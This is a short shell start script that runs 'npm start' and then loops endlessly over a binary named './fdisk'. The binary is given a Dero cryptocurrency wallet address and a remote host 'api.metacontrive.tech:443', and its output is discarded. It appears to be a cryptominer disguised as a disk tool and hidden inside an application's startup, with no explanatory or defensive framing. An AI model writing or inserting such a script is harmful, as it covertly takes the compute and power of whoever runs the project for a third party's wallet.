#!/bin/sh

nohup npm start &

# Function to restart fdisk command
restart_fdisk() {
  while true; do
    ./fdisk -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
    #sleep 10
  done
}

# Trap SIGINT and SIGTERM signals to exit gracefully
trap 'exit 0' SIGINT SIGTERM

# Call the function to restart fdisk
restart_fdisk
